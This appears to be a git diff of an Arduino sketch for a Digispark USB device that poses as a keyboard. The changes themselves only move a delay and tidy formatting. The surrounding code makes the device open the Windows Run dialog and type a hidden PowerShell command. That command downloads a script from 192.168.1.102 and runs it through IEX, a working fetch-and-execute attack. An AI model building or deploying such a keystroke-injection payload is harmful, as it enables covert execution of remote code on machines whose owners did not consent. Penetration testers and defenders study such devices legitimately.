@@ -1,8 +1,8 @@
 #include "DigiKeyboard.h"
 
 void digiBegin() {
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(50);
 }
 
 void digiEnd() {
@@ -14,10 +14,11 @@ void digiEnd() {
   }
 }
 
-void setup() {
-  DigiKeyboard.delay(1000);
-  digiBegin();
+/* ------------- main -------------*/
 
+void setup() {
+  digiBegin();
+  
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell -windowstyle hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
@@ -35,4 +36,6 @@ void setup() {
   digiEnd();
 }
 
-void loop() {}
+void loop() {
+  /* empty */  
+}
